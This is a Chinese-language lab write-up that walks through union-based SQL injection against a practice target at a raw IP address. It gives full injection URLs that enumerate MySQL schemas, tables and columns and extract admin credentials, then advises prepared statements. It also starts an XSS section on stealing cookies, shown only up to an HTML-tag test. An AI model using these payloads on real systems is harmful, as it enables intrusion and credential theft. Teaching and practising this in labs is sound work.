# sql注入

## 通过sql注入获取管理员账号密码

### 环境
靶场：http://117.167.136.245:10180/
工具：chrome , navicat



### 流程

#### 1.进入网站 
![](https://demonself.oss-cn-hangzhou.aliyuncs.com/sql-inject1.png)

#### 2.寻找可能注入的点
![](https://demonself.oss-cn-hangzhou.aliyuncs.com/sql-inject2.png)

#### 3.写sql，进行注入

**如果是mysql，需要特别关注information_schema这个库，存储了这个mysql的所有信息**

##### a.获取所有数据库

http://117.167.136.245:10180/?id=1 and 1=2 union select 1, (select GROUP_CONCAT(schema_name) from information_schema
.SCHEMATA)

information_schema,maoshe,test

##### b.根据数据库获取所有表

http://117.167.136.245:10180/?id=1 and 1=2 union select 1, (select GROUP_CONCAT(table_name) from information_schema
.TABLES where table_schema='maoshe')

admin,dirs,news,xss

##### c.根据表获取所有字段

http://117.167.136.245:10180/?id=1 and 1=2 union select 1, (select GROUP_CONCAT(column_name) from information_schema
.columns where table_schema='maoshe' and table_name='admin')

Id,username,password

##### d.根据字段获取对应字段的值,这里我获取admin这张表的第一条数据

http://117.167.136.245:10180/?id=1 and 1=2 union select 1, (select GROUP_CONCAT(username,',',`password`) from admin
 limit 1)
![](https://demonself.oss-cn-hangzhou.aliyuncs.com/sql-inject3.png)

### 总结

1.关注mysql的information_schema库。

2.**服务对数据库进行操作的时候必须用预编译（PrepareStatement），防止sql注入**


# XSS

1、xss危害

2、xss原理
xss 是将用户输入的数据当做HTML语句放入页面上执行。

3、xss种类

反射型： 你提交的数据成功的实现了XSS，但是仅仅是对你这次访问产生了影响，是非持久性的。

存储型： 你提交的数据成功的实现了XSS，并且存入数据库，别人访问的时候也会触发。

DOM型：

4、利用xss获取目标cookie

### 环境：

靶场：http://59.63.200.79:8004/Feedback.asp

工具：chrome

### 流程

发现一个客户反馈页面，其中包含很多输入框，我们所有输入框输入【<h1>111</h1>】 输入内容包含html的【h1】标签
![](https://demonself.oss-cn-hangzhou.aliyuncs.com/xss.png)
